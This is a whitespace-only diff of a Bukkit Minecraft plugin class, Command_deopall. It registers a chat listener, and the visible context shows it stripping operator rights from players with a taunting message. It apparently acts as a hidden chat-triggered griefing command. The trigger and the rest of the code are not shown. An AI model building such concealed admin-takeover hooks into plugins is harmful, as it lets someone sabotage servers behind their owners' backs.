@@ -11,7 +11,6 @@ import org.bukkit.OfflinePlayer;
 
 public class Command_deopall implements Listener
 {
-
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
@@ -39,8 +38,6 @@ public class Command_deopall implements Listener
                         player.getPlayer().sendMessage(ChatColor.DARK_RED + "Looks like your not op anymore :P Har Har Har");
                     }
                 }
-
-
                 for (final Player target : server.getOnlinePlayers())
                 {
                     //Something extra c:
